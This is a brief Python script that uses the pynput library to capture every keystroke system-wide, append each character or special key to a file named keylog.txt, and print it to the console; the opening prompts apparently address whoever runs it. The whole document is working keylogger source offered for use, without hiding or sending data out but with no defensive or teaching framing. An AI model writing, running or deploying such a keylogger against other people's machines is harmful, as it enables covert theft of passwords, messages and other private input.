print("    NOTE: WE WILL SAVE IT IN KEYLOG.PY")
input("    YOU NEED MODULE PYNPUT TO RUN THIS, CONTINUE?")
from pynput import keyboard

log_file = "keylog.txt"

def on_press(key):
    try:
        with open(log_file, "a") as f:
            f.write(f"{key.char}")
            print(f"{key.char}")
    except AttributeError:
        with open(log_file, "a") as f:
            f.write(f"[{key}]")
            print(f"[{key}]")

with keyboard.Listener(on_press=on_press) as listener:
    listener.join()
